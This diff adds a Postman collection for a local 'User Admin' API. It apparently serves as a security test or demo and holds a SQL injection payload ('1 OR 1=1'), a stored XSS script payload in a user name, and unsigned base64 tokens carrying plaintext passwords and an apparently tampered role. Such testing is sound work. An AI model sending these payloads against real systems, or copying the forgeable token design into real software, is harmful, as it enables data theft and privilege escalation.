@@ -1,0 +1,159 @@
+{
+	"info": {
+		"name": "User Admin",
+		"_postman_id": "c3b0da20-05e5-6d77-76c4-1ff93feab741",
+		"description": "",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "SQL Injection",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Token",
+						"value": "ewoiaWQiOjEwMDA0LAoibmFtZSI6ImFoc29rYSIsCiJwYXNzd29yZCI6ImFoc29rYSIsCiJlbWFpbCI6ImFoc29rYUBqZWRpLmNvbSIsCiJyb2xlIjp7CiJpZCI6NSwKIm5hbWUiOiJwYWRhd2FuIgp9Cn0",
+						"disabled": true
+					}
+				],
+				"body": {},
+				"url": {
+					"raw": "localhost:8080/v1/roles?id=1 OR 1=1",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"v1",
+						"roles"
+					],
+					"query": [
+						{
+							"key": "id",
+							"value": "1 OR 1=1",
+							"equals": true
+						}
+					]
+				},
+				"description": ""
+			},
+			"response": []
+		},
+		{
+			"name": "Users",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Token",
+						"value": "ewoiaWQiOjEwMDA0LAoibmFtZSI6ImFoc29rYSIsCiJwYXNzd29yZCI6ImFoc29rYSIsCiJlbWFpbCI6ImFoc29rYUBqZWRpLmNvbSIsCiJyb2xlIjp7CiJpZCI6NSwKIm5hbWUiOiJwYWRhd2FuIgp9Cn0",
+						"disabled": true
+					}
+				],
+				"body": {},
+				"url": {
+					"raw": "localhost:8080/v1/users",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"v1",
+						"users"
+					]
+				},
+				"description": ""
+			},
+			"response": []
+		},
+		{
+			"name": "XSS",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n\t\"name\": \"solo<script>alert(\\\"Han Solo was here!\\\")</script>\",\n\t\"password\": \"solo\",\n\t\"email\": \"solo@sciensa.com\"\n}"
+				},
+				"url": {
+					"raw": "localhost:8080/v1/users",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"v1",
+						"users"
+					]
+				},
+				"description": ""
+			},
+			"response": []
+		},
+		{
+			"name": "Login",
+			"request": {
+				"auth": {
+					"type": "noauth"
+				},
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n\t\"name\": \"ahsoka\",\n\t\"password\": \"ahsoka\"\n}"
+				},
+				"url": {
+					"raw": "localhost:8080/v1/login",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"v1",
+						"login"
+					]
+				},
+				"description": ""
+			},
+			"response": []
+		},
+		{
+			"name": "Security Users",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Token",
+						"value": "eyJpZCI6MTAwMDQsIm5hbWUiOiJhaHNva2EiLCJwYXNzd29yZCI6ImFoc29rYSIsImVtYWlsIjoiYWhzb2thQGplZGkuY29tIiwicm9sZSI6eyJpZCI6MiwibmFtZSI6InBhZGF3YW4ifX0",
+						"description": "ewoiaWQiOjEwMDA0LAoibmFtZSI6ImFoc29rYSIsCiJwYXNzd29yZCI6ImFoc29rYSIsCiJlbWFpbCI6ImFoc29rYUBqZWRpLmNvbSIsCiJyb2xlIjp7CiJpZCI6NSwKIm5hbWUiOiJwYWRhd2FuIgp9Cn0"
+					}
+				],
+				"body": {},
+				"url": {
+					"raw": "localhost:8080/v1/susers",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"v1",
+						"susers"
+					]
+				},
+				"description": ""
+			},
+			"response": []
+		}
+	]
+}
